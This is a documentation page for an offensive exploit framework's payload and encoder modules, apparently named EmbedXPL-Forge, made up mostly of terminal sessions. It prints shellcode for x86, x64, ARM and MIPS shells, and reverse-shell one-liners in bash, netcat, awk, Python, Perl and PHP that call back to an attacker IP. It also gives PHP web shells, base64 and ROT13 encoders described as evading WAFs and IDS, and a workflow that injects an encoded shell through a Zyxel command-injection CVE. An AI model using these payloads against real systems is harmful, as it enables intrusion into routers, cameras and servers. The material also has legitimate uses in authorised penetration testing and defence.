# Payloads and Encoders

**Language:** English (en-US) | **pt-BR:** [../pt-BR/09-payloads-e-encoders.md](../pt-BR/09-payloads-e-encoders.md)

---

## Overview

EmbedXPL-Forge ships **32 payload modules** across **9 architecture/language categories** and **13 encoder modules** across **3 language categories**. Payloads are standalone shellcode generators or script-based shells usable directly or embedded in exploit modules. Encoders transform payload bytes for obfuscation or transport.

### Payload categories

| Category | Path prefix | Count | Description |
|----------|-------------|-------|-------------|
| `x86` | `payloads/x86/` | 2 | Intel x86 32-bit shellcode |
| `x64` | `payloads/x64/` | 2 | Intel x86-64 / AMD64 shellcode |
| `armle` | `payloads/armle/` | 2 | ARM little-endian (ARM32, Cortex-A) |
| `mipsbe` | `payloads/mipsbe/` | 2 | MIPS big-endian (routers, cameras) |
| `mipsle` | `payloads/mipsle/` | 2 | MIPS little-endian |
| `cmd` | `payloads/cmd/` | 14 | Command-line / shell-based payloads |
| `python` | `payloads/python/` | 4 | Python 3 socket-based payloads |
| `php` | `payloads/php/` | 2 | PHP payloads (web shells) |
| `perl` | `payloads/perl/` | 2 | Perl payloads |

### Encoder categories

| Category | Path prefix | Count | Algorithms |
|----------|-------------|-------|------------|
| `python` | `encoders/python/` | 5 | base32, base64, hex, rot13, url |
| `php` | `encoders/php/` | 4 | base64, hex, rot13, url |
| `perl` | `encoders/perl/` | 4 | base64, hex, rot13, url |

---

## Architecture payloads: binary shellcode

Binary shellcode payloads generate position-independent ELF-ready shellcode for the target architecture. They are used directly by exploit modules when `shell_type` matches the target OS/arch, or manually for custom integration.

### Common options (all binary payload modules)

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `lhost` | `OptIP` | Yes (reverse) | `""` | IPv4 | Attacker listener IP |
| `lport` | `OptPort` | Yes (reverse) | `4444` | 1-65535 | Attacker listener port |
| `port` | `OptPort` | Yes (bind) | `4444` | 1-65535 | Port to bind on target |
| `badchars` | `OptString` | No | `""` | hex chars, e.g. `\x00\x0a` | Characters to avoid in shellcode |
| `format` | `OptString` | No | `raw` | `raw`, `hex`, `c`, `python` | Output format |

---

### x86 — Intel 32-bit

| Module | Path | Description |
|--------|------|-------------|
| `bind_tcp` | `payloads/x86/bind_tcp` | Bind TCP shell on target port (x86 Linux) |
| `reverse_tcp` | `payloads/x86/reverse_tcp` | Reverse TCP shell to attacker (x86 Linux) |

**Terminal session — x86 reverse_tcp:**

```text
exf > use payloads/x86/reverse_tcp
exf (x86 Reverse TCP Shell) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (x86 Reverse TCP Shell) > set lport 4444
[+] lport => 4444
exf (x86 Reverse TCP Shell) > show options

Target options:
┌──────────┬──────────────────┬──────────────────────────────────────────┐
│ Name     │ Current settings │ Description                              │
├──────────┼──────────────────┼──────────────────────────────────────────┤
│ lhost    │ 10.0.0.99        │ Attacker listener IP                     │
│ lport    │ 4444             │ Attacker listener port                   │
│ badchars │                  │ Characters to avoid in shellcode         │
│ format   │ raw              │ Output format: raw/hex/c/python          │
└──────────┴──────────────────┴──────────────────────────────────────────┘

exf (x86 Reverse TCP Shell) > set format python
[+] format => python
exf (x86 Reverse TCP Shell) > run
[*] Running module ...
[*] Generating x86 Linux reverse TCP shellcode
    LHOST: 10.0.0.99, LPORT: 4444
    Badchars: (none)

[+] Shellcode (68 bytes):
buf = b""
buf += b"\x31\xc0\x50\x6a\x01\x6a\x02\x89\xe1\xb0\x66"
buf += b"\xcd\x80\x89\xc3\x68\x0a\x00\x00\x63\x66\x68"
buf += b"\x11\x5c\x43\x66\x6a\x02\x89\xe1\x6a\x10\x51"
buf += b"\x53\x89\xe1\xb0\x66\xb3\x03\xcd\x80\x31\xc9"
buf += b"\xb1\x03\x49\x6a\x3f\x58\xcd\x80\x75\xf8\x31"
buf += b"\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
buf += b"\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd"
buf += b"\x80"

# Usage: nc -lnvp 4444  (or msfconsole handler)
# Then inject buf into target process
```

**Terminal session — x86 bind_tcp:**

```text
exf > use payloads/x86/bind_tcp
exf (x86 Bind TCP Shell) > set port 5555
[+] port => 5555
exf (x86 Bind TCP Shell) > set format c
[+] format => c
exf (x86 Bind TCP Shell) > run
[*] Running module ...
[*] Generating x86 Linux bind TCP shellcode
    LPORT: 5555, Badchars: (none)

[+] Shellcode (89 bytes):
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
"\xcd\x80\x5b\x5e\x52\x68\x15\xb3\x00\x00\x66\x68\x15"
"\xb3\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\xb0\x66\xb3"
"\x04\xcd\x80\xb0\x66\x43\xcd\x80\x59\x52\x59\xb1\x02"
"\x93\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2"
"\xb0\x0b\xcd\x80";

// Connect: nc 192.168.1.100 5555
```

---

### x64 — Intel 64-bit

| Module | Path | Description |
|--------|------|-------------|
| `bind_tcp` | `payloads/x64/bind_tcp` | Bind TCP shell (x64 Linux) |
| `reverse_tcp` | `payloads/x64/reverse_tcp` | Reverse TCP shell (x64 Linux) |

**Terminal session — x64 reverse_tcp:**

```text
exf > use payloads/x64/reverse_tcp
exf (x64 Reverse TCP Shell) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (x64 Reverse TCP Shell) > set lport 4444
[+] lport => 4444
exf (x64 Reverse TCP Shell) > run
[*] Running module ...
[*] Generating x64 Linux reverse TCP shellcode
    LHOST: 10.0.0.99, LPORT: 4444

[+] Shellcode (74 bytes):
buf = b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"
buf += b"\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a"
buf += b"\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d"
buf += b"\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
buf += b"\x02\x11\x5c\xc7\x44\x24\x04\x0a\x00\x00\x63\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x41\xff\xc0\x6a\x2a\x58\x0f"
buf += b"\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21"
buf += b"\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x54\x5e\x5f"
buf += b"\x6a\x3b\x58\x0f\x05"

# Arch: x86_64 Linux, no null bytes
```

---

### armle — ARM little-endian

| Module | Path | Description |
|--------|------|-------------|
| `bind_tcp` | `payloads/armle/bind_tcp` | Bind TCP shell (ARM LE — routers, cameras, IoT) |
| `reverse_tcp` | `payloads/armle/reverse_tcp` | Reverse TCP shell (ARM LE) |

**Terminal session — armle reverse_tcp:**

```text
exf > use payloads/armle/reverse_tcp
exf (ARM LE Reverse TCP Shell) > set lhost 192.168.1.200
[+] lhost => 192.168.1.200
exf (ARM LE Reverse TCP Shell) > set lport 4444
[+] lport => 4444
exf (ARM LE Reverse TCP Shell) > set format hex
[+] format => hex
exf (ARM LE Reverse TCP Shell) > run
[*] Running module ...
[*] Generating ARM little-endian reverse TCP shellcode
    Target arch: ARM Cortex-A (Linux EABI)
    LHOST: 192.168.1.200, LPORT: 4444

[+] Shellcode (80 bytes, hex):
02 00 a0 e3 01 10 a0 e3 0e 70 a0 e3 01 00 a0 e3
00 00 00 ef 00 40 a0 e1 07 10 a0 e3 c0 a1 8d e2
02 00 82 e3 c0 10 8d e2 10 20 a0 e3 61 70 a0 e3
03 00 a0 e3 00 00 00 ef 03 10 a0 e3 3f 70 a0 e3
00 00 00 ef 00 10 a0 e1 01 00 51 e1 fb ff ff 1a
01 30 a0 e3 66 00 8f e2 0d 00 8f e2 0e 70 a0 e3
00 00 00 ef

# Target: ARM32 embedded Linux (routers: ASUS RT-N, cameras: Hikvision)
```

---

### mipsbe — MIPS big-endian

| Module | Path | Description |
|--------|------|-------------|
| `bind_tcp` | `payloads/mipsbe/bind_tcp` | Bind TCP shell (MIPS BE — Cisco, Juniper, D-Link) |
| `reverse_tcp` | `payloads/mipsbe/reverse_tcp` | Reverse TCP shell (MIPS BE) |

**Terminal session — mipsbe reverse_tcp:**

```text
exf > use payloads/mipsbe/reverse_tcp
exf (MIPS BE Reverse TCP Shell) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (MIPS BE Reverse TCP Shell) > set lport 4444
[+] lport => 4444
exf (MIPS BE Reverse TCP Shell) > run
[*] Running module ...
[*] Generating MIPS big-endian reverse TCP shellcode
    Target arch: MIPS32 BE Linux (e.g. Cisco RV series, D-Link)
    LHOST: 10.0.0.99, LPORT: 4444

[+] Shellcode (112 bytes):
buf = b"\x24\x0f\xff\xfd\x01\xe0\x78\x27\x21\xe4\xff\xff"
buf += b"\x28\x06\x00\x01\x28\x07\xff\xfe\x24\x02\x10\x57"
buf += b"\x01\x01\x01\x0c\xaf\xa2\xff\xf8\x21\x10\xc0\x20"
buf += b"\x24\x11\x00\x07\x24\x1a\x00\x77\x24\x02\x10\x49"
buf += b"\x01\x01\x01\x0c\x24\x11\x00\x0a\x00\x00\x00\x63"
buf += b"\x24\x0a\x11\x5c\x24\x09\x11\x5c"
# ... (truncated for display)
```

---

### mipsle — MIPS little-endian

| Module | Path | Description |
|--------|------|-------------|
| `bind_tcp` | `payloads/mipsle/bind_tcp` | Bind TCP shell (MIPS LE — TP-Link, Netgear, Zyxel) |
| `reverse_tcp` | `payloads/mipsle/reverse_tcp` | Reverse TCP shell (MIPS LE) |

**Terminal session — mipsle bind_tcp:**

```text
exf > use payloads/mipsle/bind_tcp
exf (MIPS LE Bind TCP Shell) > set port 6666
[+] port => 6666
exf (MIPS LE Bind TCP Shell) > set badchars "\x00\x0a\x0d"
[+] badchars => \x00\x0a\x0d
exf (MIPS LE Bind TCP Shell) > run
[*] Running module ...
[*] Generating MIPS little-endian bind TCP shellcode
    Target arch: MIPS32 LE Linux (e.g. TP-Link Archer, Netgear R7000)
    LPORT: 6666, Badchars: \x00\x0a\x0d

[+] Checking shellcode for bad characters...
[+] No bad characters detected in 120-byte shellcode
[+] Shellcode (120 bytes):
buf = b"\xfd\xff\x0f\x24\x27\x78\xe0\x01\xff\xff\xe4\x21"
...

# Connect: nc 192.168.1.100 6666
```

---

## Command-line / script payloads

`payloads/cmd/` contains 14 modules for shell, scripting language, and utility-based payloads that inject via command injection vulnerabilities. No shellcode compilation needed — payloads run directly on the target's existing interpreter.

| Module | Path | Description |
|--------|------|-------------|
| `bash_reverse_tcp` | `payloads/cmd/bash_reverse_tcp` | `/dev/tcp` bash reverse shell |
| `netcat_bind_tcp` | `payloads/cmd/netcat_bind_tcp` | Netcat bind shell (`nc -lnvp`) |
| `netcat_reverse_tcp` | `payloads/cmd/netcat_reverse_tcp` | Netcat reverse shell |
| `awk_bind_tcp` | `payloads/cmd/awk_bind_tcp` | AWK bind TCP shell |
| `awk_bind_udp` | `payloads/cmd/awk_bind_udp` | AWK bind UDP shell |
| `awk_reverse_tcp` | `payloads/cmd/awk_reverse_tcp` | AWK reverse TCP shell |
| `perl_bind_tcp` | `payloads/cmd/perl_bind_tcp` | Perl command-line bind shell |
| `perl_reverse_tcp` | `payloads/cmd/perl_reverse_tcp` | Perl command-line reverse shell |
| `php_bind_tcp` | `payloads/cmd/php_bind_tcp` | PHP command-line bind shell |
| `php_reverse_tcp` | `payloads/cmd/php_reverse_tcp` | PHP command-line reverse shell |
| `python_bind_tcp` | `payloads/cmd/python_bind_tcp` | Python 3 command-line bind shell |
| `python_bind_udp` | `payloads/cmd/python_bind_udp` | Python 3 command-line bind UDP shell |
| `python_reverse_tcp` | `payloads/cmd/python_reverse_tcp` | Python 3 command-line reverse shell |
| `python_reverse_udp` | `payloads/cmd/python_reverse_udp` | Python 3 command-line reverse UDP shell |

### Common options (cmd/ payloads)

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `lhost` | `OptIP` | Yes (reverse) | `""` | IPv4 | Attacker listener IP |
| `lport` | `OptPort` | Yes | `4444` | 1-65535 | Port number |
| `port` | `OptPort` | Yes (bind) | `4444` | 1-65535 | Bind port on target |
| `encode` | `OptBool` | No | `False` | `true/false` | Base64-encode the command (for injection via HTTP) |

**Terminal session — bash_reverse_tcp:**

```text
exf > use payloads/cmd/bash_reverse_tcp
exf (Bash Reverse TCP Shell) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Bash Reverse TCP Shell) > set lport 4444
[+] lport => 4444
exf (Bash Reverse TCP Shell) > run
[*] Running module ...
[*] Payload: bash -i >& /dev/tcp/10.0.0.99/4444 0>&1

[+] Command (raw):
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1

[+] Command (URL-encoded for HTTP injection):
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.99%2F4444%200%3E%261

[+] Start listener: nc -lnvp 4444
```

**Terminal session — netcat_reverse_tcp:**

```text
exf > use payloads/cmd/netcat_reverse_tcp
exf (Netcat Reverse TCP Shell) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Netcat Reverse TCP Shell) > set lport 4445
[+] lport => 4445
exf (Netcat Reverse TCP Shell) > run
[*] Running module ...
[+] Command (standard netcat with -e):
nc 10.0.0.99 4445 -e /bin/sh

[+] Command (busybox netcat, no -e flag, for embedded Linux):
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.99 4445 > /tmp/f

[+] Start listener: nc -lnvp 4445
```

**Terminal session — awk_reverse_tcp:**

```text
exf > use payloads/cmd/awk_reverse_tcp
exf (AWK Reverse TCP Shell) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (AWK Reverse TCP Shell) > set lport 4444
[+] lport => 4444
exf (AWK Reverse TCP Shell) > run
[*] Running module ...
[+] Command:
awk 'BEGIN{s="/inet/tcp/0/10.0.0.99/4444";while(1){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit")close(s)}}' /dev/null

[+] Notes: Works on BusyBox awk (embedded routers/cameras). No /bin/sh dependency.
```

**Terminal session — python_reverse_tcp (cmd/):**

```text
exf > use payloads/cmd/python_reverse_tcp
exf (Python3 Reverse TCP Shell) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Python3 Reverse TCP Shell) > set lport 4444
[+] lport => 4444
exf (Python3 Reverse TCP Shell) > run
[*] Running module ...
[+] Command:
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.99',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

[+] One-liner base64 (for injection through JSON/HTTP):
python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9...'))"
```

**Terminal session — awk_bind_tcp:**

```text
exf > use payloads/cmd/awk_bind_tcp
exf (AWK Bind TCP Shell) > set port 7777
[+] port => 7777
exf (AWK Bind TCP Shell) > run
[*] Running module ...
[+] Command (bind on target port 7777):
awk 'BEGIN{s="/inet/tcp/7777/0/0";while(1){do{s |& getline c;print "$ " |& s;while((c |& getline)>0){print $0 |& s};close(c)}while(c!="exit");close(s)}}' /dev/null

[+] Connect with: nc 192.168.1.100 7777
```

---

## Python payloads (module-based)

`payloads/python/` contains 4 Python 3 socket-based payloads usable as Python modules.

| Module | Path | Description |
|--------|------|-------------|
| `bind_tcp` | `payloads/python/bind_tcp` | Python 3 bind TCP server-side shell |
| `bind_udp` | `payloads/python/bind_udp` | Python 3 bind UDP shell |
| `reverse_tcp` | `payloads/python/reverse_tcp` | Python 3 reverse TCP shell |
| `reverse_udp` | `payloads/python/reverse_udp` | Python 3 reverse UDP shell |

**Terminal session — python/reverse_tcp:**

```text
exf > use payloads/python/reverse_tcp
exf (Python3 Reverse TCP Module) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Python3 Reverse TCP Module) > set lport 4444
[+] lport => 4444
exf (Python3 Reverse TCP Module) > run
[*] Running module ...
[*] Generating Python 3 reverse TCP shell module
    LHOST: 10.0.0.99, LPORT: 4444

[+] Payload (Python 3 module):
import socket, subprocess, os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.Popen(['/bin/sh', '-i'])
    s.close()

if __name__ == '__main__':
    reverse_shell('10.0.0.99', 4444)

[+] Start listener: nc -lnvp 4444 or msfconsole -x "use multi/handler; set payload python/shell_reverse_tcp..."
```

**Terminal session — python/bind_udp:**

```text
exf > use payloads/python/bind_udp
exf (Python3 Bind UDP Module) > set port 5555
[+] port => 5555
exf (Python3 Bind UDP Module) > run
[*] Running module ...
[+] Payload (Python 3 UDP bind shell):
import socket, subprocess, os

def udp_shell(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('0.0.0.0', port))
    while True:
        data, addr = s.recvfrom(4096)
        result = subprocess.run(data.decode().strip(), shell=True,
                                capture_output=True, text=True)
        s.sendto((result.stdout + result.stderr).encode(), addr)

if __name__ == '__main__':
    udp_shell(5555)

[+] Use: nc -u 192.168.1.100 5555
[+] Note: UDP shells are stateless — ideal for firewalls that block TCP
```

---

## PHP payloads

| Module | Path | Description |
|--------|------|-------------|
| `bind_tcp` | `payloads/php/bind_tcp` | PHP bind TCP shell (web server context) |
| `reverse_tcp` | `payloads/php/reverse_tcp` | PHP reverse TCP shell (web server context) |

**Terminal session — php/reverse_tcp:**

```text
exf > use payloads/php/reverse_tcp
exf (PHP Reverse TCP Shell) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (PHP Reverse TCP Shell) > set lport 4444
[+] lport => 4444
exf (PHP Reverse TCP Shell) > run
[*] Running module ...
[*] Generating PHP reverse TCP shell
    LHOST: 10.0.0.99, LPORT: 4444

[+] Payload (PHP):
<?php
$sock = fsockopen("10.0.0.99", 4444);
$proc = proc_open("/bin/sh -i", [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
proc_close($proc);
?>

[+] One-liner (for injection via RFI or command execution):
<?php system('bash -c "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"');?>

[+] Obfuscated (via encoder):
<?php eval(base64_decode('JHNvY2sgPSBmc29ja29wZW4oIjEwLjAuMC45OSIsIDQ0NDQpO...')); ?>
```

**Terminal session — php/bind_tcp:**

```text
exf > use payloads/php/bind_tcp
exf (PHP Bind TCP Shell) > set port 8888
[+] port => 8888
exf (PHP Bind TCP Shell) > run
[*] Running module ...
[+] Payload (PHP bind shell on port 8888):
<?php
$server = stream_socket_server("tcp://0.0.0.0:8888", $errno, $errstr);
$client = stream_socket_accept($server);
while ($cmd = fgets($client)) {
    $output = shell_exec(trim($cmd));
    fwrite($client, $output);
}
?>

[+] Connect: nc 192.168.1.100 8888
```

---

## Perl payloads

| Module | Path | Description |
|--------|------|-------------|
| `bind_tcp` | `payloads/perl/bind_tcp` | Perl bind TCP shell |
| `reverse_tcp` | `payloads/perl/reverse_tcp` | Perl reverse TCP shell |

**Terminal session — perl/reverse_tcp:**

```text
exf > use payloads/perl/reverse_tcp
exf (Perl Reverse TCP Shell) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99
exf (Perl Reverse TCP Shell) > set lport 4444
[+] lport => 4444
exf (Perl Reverse TCP Shell) > run
[*] Running module ...
[+] Payload:
perl -e 'use Socket;$i="10.0.0.99";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

[+] One-liner (safe for shell injection):
perl -MSocket -e 'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("10.0.0.99")));open STDIN,">&S";open STDOUT,">&S";open STDERR,">&S";exec{"/bin/sh"}"-i"'
```

---

## Encoders

Encoders transform payload bytes or script content for obfuscation, transport encoding, or injection into restricted character sets.

### Encoder module map

| Module | Path | Input | Output | Notes |
|--------|------|-------|--------|-------|
| `python/base64` | `encoders/python/base64` | Python payload string | `base64.b64encode()` wrapped eval | Standard base64 |
| `python/base32` | `encoders/python/base32` | Python payload string | `base64.b32encode()` wrapped eval | Base32 variant |
| `python/hex` | `encoders/python/hex` | Python payload string | `bytes.fromhex()` wrapped exec | Hex encoding |
| `python/rot13` | `encoders/python/rot13` | Python payload string | `codecs.decode(...,'rot_13')` exec | ROT13 |
| `python/url` | `encoders/python/url` | Python payload string | `urllib.parse.unquote()` exec | URL encoding |
| `php/base64` | `encoders/php/base64` | PHP payload string | `eval(base64_decode(...))` | PHP base64 |
| `php/hex` | `encoders/php/hex` | PHP payload string | `eval(hex2bin(...))` | PHP hex |
| `php/rot13` | `encoders/php/rot13` | PHP payload string | `eval(str_rot13(...))` | PHP ROT13 |
| `php/url` | `encoders/php/url` | PHP payload string | `eval(urldecode(...))` | PHP URL encoding |
| `perl/base64` | `encoders/perl/base64` | Perl payload string | `eval(decode_base64(...))` | Perl base64 |
| `perl/hex` | `encoders/perl/hex` | Perl payload string | `eval(pack('H*',...))` | Perl hex |
| `perl/rot13` | `encoders/perl/rot13` | Perl payload string | `eval(y/A-Za-z/N-ZA-Mn-za-m/)` | Perl ROT13 |
| `perl/url` | `encoders/perl/url` | Perl payload string | `eval(URI::Escape::uri_unescape(...))` | Perl URL encoding |

### Common encoder options

| Parameter | Type | Required | Default | Accepted values | Description |
|-----------|------|----------|---------|-----------------|-------------|
| `payload` | `OptString` | Yes | `""` | any string | Raw payload content to encode |
| `iterations` | `OptInteger` | No | `1` | 1-10 | Number of encoding passes |
| `output` | `OptString` | No | `stdout` | `stdout`, file path | Output destination |

---

### Terminal session — encoders/python/base64

```text
exf > use encoders/python/base64
exf (Python Base64 Encoder) > set payload "import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.99',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
[+] payload => import socket,subprocess,os;s=socket.socket()...
exf (Python Base64 Encoder) > run
[*] Running module ...
[*] Encoding Python payload with base64 (1 pass)

[+] Encoded payload:
exec(__import__('base64').b64decode(b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoJzEwLjAuMC45OScsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTtvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3N1YnByb2Nlc3MuY2FsbChbJy9iaW4vc2gnLCctaSddKQ==').decode())

[+] Usage: inject as single-line Python in command injection context
[+] Or: python3 -c "exec(__import__('base64').b64decode(b'aW1wb3J0...'))"
```

### Terminal session — encoders/python/base64 with 2 iterations (double encoding)

```text
exf (Python Base64 Encoder) > set iterations 2
[+] iterations => 2
exf (Python Base64 Encoder) > run
[*] Running module ...
[*] Encoding Python payload with base64 (2 passes)

[+] Encoded payload (double base64):
exec(__import__('base64').b64decode(__import__('base64').b64decode(b'WlhaaWIzUjBYMkJoWTJ0bGJpZ3hJRUpzWVhraVlYZHo...').decode()).decode())
```

### Terminal session — encoders/php/base64

```text
exf > use encoders/php/base64
exf (PHP Base64 Encoder) > set payload "<?php system($_GET['cmd']); ?>"
[+] payload => <?php system($_GET['cmd']); ?>
exf (PHP Base64 Encoder) > run
[*] Running module ...
[*] Encoding PHP payload with base64 (1 pass)

[+] Encoded payload:
<?php eval(base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+')); ?>

[+] Or using echo pipe:
echo 'PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+' | base64 -d | php
```

### Terminal session — encoders/perl/hex

```text
exf > use encoders/perl/hex
exf (Perl Hex Encoder) > set payload "use Socket;\$i=\"10.0.0.99\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}"
[+] payload => use Socket;$i="10.0.0.99";...
exf (Perl Hex Encoder) > run
[*] Running module ...
[*] Encoding Perl payload with hex (1 pass)

[+] Encoded payload:
perl -e 'eval(pack("H*","75736520536f636b65743b..."
```

### Terminal session — encoders/python/url

```text
exf > use encoders/python/url
exf (Python URL Encoder) > set payload "import os;os.system('id')"
[+] payload => import os;os.system('id')
exf (Python URL Encoder) > run
[*] Running module ...
[+] URL-encoded payload (for HTTP query string injection):
import%20os%3Bos.system%28%27id%27%29

[+] Wrapped eval form:
exec(__import__('urllib.parse',fromlist=['unquote']).unquote('import%20os%3Bos.system%28%27id%27%29'))
```

### Terminal session — encoders/php/rot13

```text
exf > use encoders/php/rot13
exf (PHP ROT13 Encoder) > set payload "<?php system($_GET['cmd']); ?>"
[+] payload => <?php system($_GET['cmd']); ?>
exf (PHP ROT13 Encoder) > run
[*] Running module ...
[+] ROT13-encoded PHP payload:
<?php eval(str_rot13('<?cuc flfgrz($_TRG[\'pzq\']); ?>')); ?>

[+] Notes: ROT13 evades naive string matching in WAFs/IDS without adding null bytes.
```

---

## Payload selection guide

| Target OS | Architecture | Recommended payload category |
|-----------|-------------|------------------------------|
| Linux embedded (router/camera) | MIPS LE | `payloads/mipsle/reverse_tcp` |
| Linux embedded (router/camera) | MIPS BE | `payloads/mipsbe/reverse_tcp` |
| Linux embedded (IoT/camera) | ARM LE | `payloads/armle/reverse_tcp` |
| Linux server (x86) | x86 | `payloads/x86/reverse_tcp` |
| Linux server (x64) | x64 | `payloads/x64/reverse_tcp` |
| Any with bash | any | `payloads/cmd/bash_reverse_tcp` |
| Any with Python 3 | any | `payloads/cmd/python_reverse_tcp` |
| Any with netcat | any | `payloads/cmd/netcat_reverse_tcp` |
| Web app / RFI | any | `payloads/php/reverse_tcp` |
| Perl available | any | `payloads/perl/reverse_tcp` |
| Firewall blocks TCP | any | `payloads/python/reverse_udp` or `payloads/cmd/python_reverse_udp` |

## Combining payloads with encoders

The typical workflow for bypassing WAFs or character restrictions:

```text
# Step 1: Generate base payload
exf > use payloads/cmd/python_reverse_tcp
exf (Python3 Reverse TCP Shell) > set lhost 10.0.0.99
exf (Python3 Reverse TCP Shell) > set lport 4444
exf (Python3 Reverse TCP Shell) > run
[+] Command: python3 -c "import socket,subprocess,os;..."

# Step 2: Encode for injection
exf > use encoders/python/base64
exf (Python Base64 Encoder) > set payload "import socket,subprocess,os;..."
exf (Python Base64 Encoder) > run
[+] Encoded payload: exec(__import__('base64').b64decode(b'...').decode())

# Step 3: Inject via exploit module
exf > use exploits/firewalls/zyxel/usg_flex_cmd_injection_cve_2022_30525
exf (Zyxel USG FLEX OS Command Injection CVE-2022-30525) > set target 10.0.0.254
exf (Zyxel USG FLEX OS Command Injection CVE-2022-30525) > set command "python3 -c \"exec(__import__('base64').b64decode(b'...').decode())\""
exf (Zyxel USG FLEX OS Command Injection CVE-2022-30525) > run
```

[Wiki hub](../README.md)
